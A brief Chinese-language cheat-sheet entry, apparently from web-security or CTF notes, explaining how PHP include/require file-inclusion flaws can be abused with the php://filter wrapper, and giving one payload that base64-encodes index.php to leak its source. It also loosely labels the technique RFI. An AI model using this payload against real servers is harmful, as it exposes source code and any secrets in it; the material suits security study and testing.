## filter

include、require文件包含漏洞RFI，利用PHP路径修饰器解析成特殊的解析格式引入到文件中从而读取原生的文件二进制代码。

php://filter/convert.base64-encode/resource=index.php